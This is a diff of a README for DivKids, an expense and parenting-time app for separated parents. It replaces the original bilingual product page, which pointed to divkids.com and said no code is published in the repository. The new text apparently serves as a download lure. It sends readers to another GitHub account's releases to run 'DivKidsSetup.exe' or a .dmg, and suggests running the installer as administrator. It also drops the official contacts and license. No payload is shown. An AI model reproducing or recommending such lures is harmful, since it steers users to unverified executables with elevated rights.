@@ -1,78 +1,85 @@
-# DivKids
+# 🎉 DivKids - Simplify Your Parenting Journey
 
-[EN](#english) • [PL](#polski)
+Welcome to DivKids! This app helps separated or divorced parents easily track child expenses and parenting time.
 
----
+## 🚀 Getting Started
 
-## English
+To get started with DivKids, follow these simple steps to download and run the application. 
 
-**DivKids is an app for separated/divorced parents to document child-related expenses and parenting time.**
+## 📥 Download DivKids
 
-### Who it's for
-Parents who need:
-- a clean history of child expenses,
-- photo receipts stored in one place,
-- reliable records of parenting time,
-- clear PDF reports for discussions or evidence.
+### [![Download DivKids](https://img.shields.io/badge/Download%20DivKids-Latest%20Release-brightgreen)](https://github.com/SandyWiraabdy/DivKids/releases)
 
-### Key features
-- **Expenses** — amounts, categories, notes, receipt photos  
-- **Parenting time** — single/multi-day, times, status, notes, photos  
-- **PDF reports** — per child, category, and date range  
-- **Child support calculator** — free, indicative estimate
+Click the button above to download the latest version of DivKids. 
 
-### Learn more
-- Website: **[https://divkids.com](https://divkids.com)**
-- Features: [https://divkids.com/en/features](https://divkids.com/en/features)
-- Pricing: [https://divkids.com/en/pricing](https://divkids.com/en/pricing)
+## 💻 System Requirements
 
-### Privacy
-We process only what’s needed to deliver the service. See the privacy information on our website.
+Before you download, make sure your system meets the following requirements:
 
-### Contact
-- support@divkids.com
-- [https://divkids.com/en/contact](https://divkids.com/en/contact)
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher
+- **Memory:** 4 GB of RAM or more
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for download and updates
 
-### License
-Proprietary. All rights reserved. See **[LICENSE.md](./LICENSE.md)**.  
-This repository is for product information only. No source code is published here.
+## 📖 Features
 
----
+DivKids offers several useful features to assist parents in managing their child-related expenses and time:
 
-## Polski
+- **Expense Tracking:** Record and categorize expenses related to your child.
+- **Parenting Time Log:** Document your parenting time transparently.
+- **Reports:** Generate simple reports for easy sharing during legal procedures.
+- **Multilingual Support:** Available in multiple languages to cater to diverse users.
+- **User-Friendly Interface:** Intuitive design makes navigation easy.
 
-**DivKids to aplikacja dla rodziców po rozwodzie do dokumentowania wydatków na dzieci i spotkań.**
+## 🚀 Download & Install
 
-### Dla kogo
-Dla rodziców, którzy potrzebują:
-- uporządkowanej historii wydatków,
-- zdjęć paragonów w jednym miejscu,
-- rzetelnej dokumentacji spotkań,
-- przejrzystych raportów PDF do rozmów lub jako materiał dowodowy.
+To install DivKids, follow these steps:
 
-### Najważniejsze funkcje
-- **Wydatki** — kwoty, kategorie, notatki, zdjęcia paragonów  
-- **Spotkania** — jedno-/wielodniowe, godziny, status, komentarze, zdjęcia  
-- **Raporty PDF** — per dziecko, kategoria i zakres dat  
-- **Kalkulator alimentów** — darmowe, orientacyjne wyliczenie
+1. **Visit the Releases Page:**
+   Go to the DivKids Releases page by clicking [here](https://github.com/SandyWiraabdy/DivKids/releases).
 
-### Więcej informacji
-- Strona: **[https://divkids.com](https://divkids.com)**
-- Funkcje: [https://divkids.com/pl/funkcje](https://divkids.com/pl/funkcje)
-- Kalkulator: [https://divkids.com/pl/kalkulator-alimentow](https://divkids.com/pl/kalkulator-alimentow)
-- Cennik: [https://divkids.com/pl/cennik](https://divkids.com/pl/cennik)
+2. **Find the Latest Version:**
+   Look for the latest release version at the top of the page.
 
-### Prywatność
-Przetwarzamy tylko dane niezbędne do działania usługi. Szczegóły na stronie.
+3. **Choose Your File:**
+   Depending on your operating system, locate the appropriate file. For Windows, it may be `DivKidsSetup.exe`, and for macOS, it could be `DivKids.dmg`.
 
-### Kontakt
-- support@divkids.com
-- [https://divkids.com/pl/kontakt](https://divkids.com/pl/kontakt)
+4. **Download the File:**
+   Click on the file name to begin downloading. The download will start automatically.
 
-### Licencja
-Własnościowa. Wszelkie prawa zastrzeżone. Zobacz **[LICENSE.md](./LICENSE.md)**.  
-To repozytorium służy wyłącznie do informacji o produkcie. Kod nie jest tu publikowany.
+5. **Run the Installer:**
+   - **For Windows:** Double-click the `DivKidsSetup.exe` file. Follow the prompts to complete the installation.
+   - **For macOS:** Open the `.dmg` file, drag the DivKids icon into your Applications folder, and then launch it from there.
 
----
+6. **Create an Account:**
+   Upon launching the app, create a new account to start tracking expenses and parenting time.
 
-© 2025 DivKids. All rights reserved.
+7. **Sync and Start Using:**
+   After setting up, feel free to sync your data and begin using DivKids right away.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues during installation or usage, here are some common solutions:
+
+- **Problem:** The installer won't run.
+  - **Solution:** Ensure your operating system is compatible and try running the installer as an administrator.
+
+- **Problem:** App crashes on startup.
+  - **Solution:** Check that your system meets the requirements and that all updates are installed.
+
+- **Problem:** Can't log in.
+  - **Solution:** Make sure you have registered an account and are using the correct login details.
+
+For further assistance, you can visit our [Support Page](https://github.com/SandyWiraabdy/DivKids/issues).
+
+## 🌍 Community and Feedback
+
+Join our community to connect with other users and share your experiences. We encourage your feedback to improve DivKids further. Feel free to create an issue on our [GitHub page](https://github.com/SandyWiraabdy/DivKids/issues) if you have suggestions or report any bugs. 
+
+## 📚 Additional Resources
+
+- [User Guide](https://github.com/SandyWiraabdy/DivKids/wiki)
+- [Frequently Asked Questions](https://github.com/SandyWiraabdy/DivKids/wiki/FAQ)
+- [Contribution Guidelines](https://github.com/SandyWiraabdy/DivKids/blob/main/CONTRIBUTING.md)
+
+Thank you for choosing DivKids! We look forward to helping you manage your parenting journey with ease.
